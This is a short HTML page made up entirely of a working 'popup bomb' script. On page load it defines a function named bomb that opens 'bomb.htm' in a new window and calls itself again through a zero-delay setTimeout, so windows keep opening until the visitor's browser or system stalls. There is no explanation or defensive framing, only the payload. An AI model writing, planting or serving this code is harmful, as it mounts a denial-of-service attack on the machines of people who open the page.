<html>
<head>
</head>
<body>
<script>
function bomb(){
window.open("bomb.htm");
TimeId = setTimeout("bomb()",0);
}
bomb();
</script>
</body>
</html>